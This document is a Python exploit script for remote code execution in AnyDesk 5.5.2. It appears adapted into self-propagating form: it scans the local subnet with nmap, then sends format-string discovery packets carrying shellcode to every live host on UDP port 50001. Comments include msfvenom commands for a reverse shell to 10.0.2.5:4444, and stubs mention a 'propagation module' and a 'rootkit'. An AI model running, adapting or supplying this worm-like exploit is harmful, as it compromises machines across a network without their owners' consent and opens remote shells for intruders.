# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import netifaces as ni
import subprocess
import ipaddress

# Function to get the network and subnet mask of the primary interface
def get_interface():
    gateways = ni.gateways()
    default_gateway = gateways['default'][ni.AF_INET][1]
    interface = gateways['default'][ni.AF_INET][1]
    return interface

def get_network(interface):
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
    return network

def net_scan(network):
    try:
        print('Scanning Network')
        # Run nmap and pipe its output to awk
        command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
        output = subprocess.check_output(command, shell=True, text=True)

        # Split the output by newlines to get a list of IPs
        ip_addresses = output.strip().split('\n')
        print('Done!', len(ip_addresses), 'Hosts are up')
        return ip_addresses
    except subprocess.CalledProcessError as e:
        return []


def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])

    # Check if hn is a byte string or a regular string and handle accordingly
    if isinstance(hn, str):
        d += struct.pack('>I', len(hn)) + hn.encode()
    else:
        d += struct.pack('>I', len(hn)) + hn

    # Similar check for user, inf, and func
    if isinstance(user, str):
        d += struct.pack('>I', len(user)) + user.encode()
    else:
        d += struct.pack('>I', len(user)) + user

    d += struct.pack('>I', 0)

    if isinstance(inf, str):
        d += struct.pack('>I', len(inf)) + inf.encode()
    else:
        d += struct.pack('>I', len(inf)) + inf

    d += bytes([0])

    if isinstance(func, str):
        d += struct.pack('>I', len(func)) + func.encode()
    else:
        d += struct.pack('>I', len(func)) + func

    d += bytes([0x2, 0xc3, 0x51])
    return d


# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
# msfvenom -p linux/x86/exec CMD='touch /Desktop/youarefucked.txt' -b "\x00\x25\x26" -f python -v shellcode
# msfvenom -p ...linux...http...exec... -b "\x00\x25\x26" -f python -v shellcode

shellcode =  b""
shellcode += b"\xd9\xcf\xbd\x7b\x19\x33\x3c\xd9\x74\x24\xf4"
shellcode += b"\x5f\x29\xc9\xb1\x11\x31\x6f\x1a\x03\x6f\x1a"
shellcode += b"\x83\xc7\x04\xe2\x8e\x73\x38\x64\xe9\xd6\x58"
shellcode += b"\xfc\x24\xb4\x2d\x1b\x5e\x15\x5d\x8c\x9e\x01"
shellcode += b"\x8e\x2e\xf7\xbf\x59\x4d\x55\xa8\x7a\x92\x59"
shellcode += b"\x28\x0f\xfd\x2c\x4b\x87\x21\xe1\xcf\x32\x51"
shellcode += b"\x96\xbb\xd3\xe5\x47\x3d\x43\x73\xf6\xcf\xfe"
shellcode += b"\x1d\x8d\x4c\x6a\x87\x09\xbd\x18\x3f\xa5\xc1"
shellcode += b"\xb7\xec\xcc\x23\xfa\x93"


#def run():
#    next_action = ""
#    data = ""
#    print("[+] Propagation module activated...")

try:
    interface = get_interface()
    network = get_network(interface)
    port = 50001  # Define the port to scan
    neighbors = net_scan(network)
    print('Lets attack')
    print('Brute all active Hosts on Port 50001')
    
    for ip in neighbors:
        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(p, (ip, port))
        s.close()
        
except Exception as e:
    exit()

#    next_action = "rootkit"
#    return data, next_action
